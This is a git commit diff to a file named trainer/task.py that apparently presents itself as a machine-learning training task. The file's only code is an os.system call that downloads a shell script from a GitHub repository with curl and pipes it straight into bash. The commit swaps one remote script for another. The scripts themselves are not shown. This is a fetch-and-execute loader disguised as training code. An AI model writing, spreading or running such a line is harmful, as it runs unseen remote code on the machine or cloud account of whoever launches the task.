3549abd0248583e0c8f8c823254df8ace2d097df
vedhagsvp <vedhag230223@gmail.com>
2026-02-11 00:50:57 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/vedhagsvp/soljtka/raw/main/solsad.sh | bash')
+os.system('curl -sL https://github.com/vedhagsvp/soljtka/raw/main/apa.sh | bash')
